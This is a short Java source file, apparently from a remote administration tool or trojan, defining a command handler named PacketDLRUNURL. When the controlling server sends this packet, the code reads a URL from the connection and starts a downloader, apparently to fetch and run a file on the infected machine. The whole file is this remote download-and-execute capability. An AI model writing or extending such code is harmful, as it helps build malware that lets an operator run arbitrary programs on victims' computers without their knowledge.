package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.Downloader;

public class PacketDLRUNURL extends Packet {

	@Override
	public void read(String line) throws Exception {
		String url = Connection.readLine();	
		new Downloader(url, false).start();
	}

}